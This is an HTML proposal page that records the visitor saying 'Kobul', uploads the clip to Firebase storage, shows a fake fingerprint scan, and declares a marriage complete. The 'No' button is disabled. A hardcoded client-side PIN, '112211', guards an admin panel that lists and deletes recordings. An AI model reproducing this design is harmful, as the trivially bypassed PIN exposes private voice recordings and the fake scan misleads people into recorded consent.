<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>For My Love üíç</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<!-- PREMIUM FONT -->
<link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@400;700&display=swap" rel="stylesheet">

<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:'Playfair Display',serif}
body{
  background:radial-gradient(circle at top,#111,#000);
  color:#fff;
  min-height:100vh;
  overflow-x:hidden;
}
.center{
  min-height:100vh;
  display:flex;
  flex-direction:column;
  align-items:center;
  justify-content:center;
  text-align:center;
  padding:20px;
}
h1,h2,p{animation:fadeUp 1.5s ease forwards}
@keyframes fadeUp{
  from{opacity:0;transform:translateY(40px)}
  to{opacity:1;transform:none}
}
.btn{
  margin:15px;
  padding:14px 40px;
  border-radius:999px;
  border:none;
  font-size:18px;
  cursor:pointer;
  background:linear-gradient(135deg,#d4af37,#fff5c3,#c89b3c);
  box-shadow:0 0 25px rgba(212,175,55,.6);
  transition:.3s;
}
.btn:hover{transform:scale(1.08)}
.hidden{display:none}

/* Floating gold particles */
body::before{
  content:"";
  position:fixed;
  inset:0;
  background:url("https://www.transparenttextures.com/patterns/gold-fabric.png");
  opacity:.08;
  pointer-events:none;
}

/* ADMIN KEY ICON */
#adminKey{
  position:fixed;
  bottom:12px;
  right:12px;
  font-size:22px;
  cursor:pointer;
  opacity:.7;
}

/* ADMIN PANEL */
.adminPanel{
  position:fixed;
  inset:0;
  background:rgba(0,0,0,.9);
  overflow:auto;
  z-index:9999;
  padding:20px;
}
.voiceItem{
  margin:15px 0;
  padding:15px;
  border:1px solid gold;
  border-radius:12px;
}
</style>
</head>

<body>

<div id="step1" class="center">
  <h1>I love you my Jan Prapti üíñ</h1>
  <h2>Will you marry me?</h2>
  <button class="btn" onclick="nextStep()">Yes</button>
  <button class="btn" onclick="alert('No option disabled üòå')">No</button>
</div>

<div id="step2" class="center hidden">
  <h2>Say ‚ÄúKobul‚Äù üéôÔ∏è</h2>
  <p>Tap microphone & speak</p>
  <button class="btn" onclick="startRecording()">üé§ Start Voice</button>
  <button class="btn hidden" id="stopBtn" onclick="stopRecording()">Stop</button>
</div>

<div id="step3" class="center hidden">
  <h2>Place your fingerprint ‚ú®</h2>
  <button class="btn" onclick="completeMarriage()">Scan Fingerprint</button>
</div>

<div id="step4" class="center hidden">
  <h1>Marriage Complete üíç</h1>
  <p>Abdullah is now your husband</p>
  <button class="btn" onclick="downloadCertificate()">Download Certificate</button>
</div>

<div id="adminKey" onclick="openAdmin()">üîë</div>

<!-- BACKGROUND MUSIC -->
<audio autoplay loop>
  <source src="https://github.com/warriorcheat/Surprise-for-my-jan/raw/refs/heads/main/music.mp3" type="audio/mpeg">
</audio>

<!-- FIREBASE -->
<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-storage-compat.js"></script>

<script>
/* ---------------- FIREBASE CONFIG ---------------- */
firebase.initializeApp({
  apiKey: "AIzaSyCXXYQnIt8ovhEidRTx-B3S0k9DZV1oi7M",
  authDomain: "for-my-love-5c7c1.firebaseapp.com",
  projectId: "for-my-love-5c7c1",
  storageBucket: "for-my-love-5c7c1.firebasestorage.app",
  messagingSenderId: "770806135468",
  appId: "1:770806135468:web:f36370075360be8d1fbd09"
});
const storage=firebase.storage();

/* ---------------- FLOW ---------------- */
function nextStep(){
  step1.classList.add("hidden");
  step2.classList.remove("hidden");
}

/* ---------------- VOICE RECORD ---------------- */
let recorder, audioChunks=[];
async function startRecording(){
  const stream=await navigator.mediaDevices.getUserMedia({audio:true});
  recorder=new MediaRecorder(stream);
  recorder.start();
  audioChunks=[];
  recorder.ondataavailable=e=>audioChunks.push(e.data);
  stopBtn.classList.remove("hidden");
}
async function stopRecording(){
  recorder.stop();
  recorder.onstop=async()=>{
    const blob=new Blob(audioChunks,{type:"audio/webm"});
    const ref=storage.ref("voices/"+Date.now()+".webm");
    await ref.put(blob);
    step2.classList.add("hidden");
    step3.classList.remove("hidden");
  }
}

/* ---------------- MARRIAGE ---------------- */
function completeMarriage(){
  step3.classList.add("hidden");
  step4.classList.remove("hidden");
}
function downloadCertificate(){
  const text="Marriage Certificate\nAbdullah ‚ù§ Prapti";
  const blob=new Blob([text],{type:"text/plain"});
  const a=document.createElement("a");
  a.href=URL.createObjectURL(blob);
  a.download="Marriage-Certificate.txt";
  a.click();
}

/* ---------------- ADMIN ---------------- */
function openAdmin(){showAdminLogin()}
function showAdminLogin(){
  const o=document.createElement("div");
  o.className="adminPanel";
  o.innerHTML=`
    <h2>Admin Login</h2>
    <input id="pin" type="password" placeholder="PIN" style="padding:10px;width:100%;margin:15px 0">
    <button class="btn" onclick="verify()">Unlock</button>
  `;
  document.body.appendChild(o);
}
async function verify(){
  if(document.getElementById("pin").value!=="112211"){alert("Wrong PIN");return}
  document.body.lastChild.remove();
  openAdminPanel();
}
async function openAdminPanel(){
  const p=document.createElement("div");
  p.className="adminPanel";
  p.innerHTML="<h2>Saved Voices</h2>";
  const list=await storage.ref("voices").listAll();
  for(const i of list.items){
    const url=await i.getDownloadURL();
    const d=document.createElement("div");
    d.className="voiceItem";
    d.innerHTML=`
      <audio controls src="${url}"></audio><br>
      <a href="${url}" download>‚¨á Download</a>
      <button onclick="storage.ref('${i.fullPath}').delete().then(()=>location.reload())">‚ùå Delete</button>
    `;
    p.appendChild(d);
  }
  p.innerHTML+=`<button class="btn" onclick="this.parentElement.remove()">Close</button>`;
  document.body.appendChild(p);
}
</script>

</body>
</html>
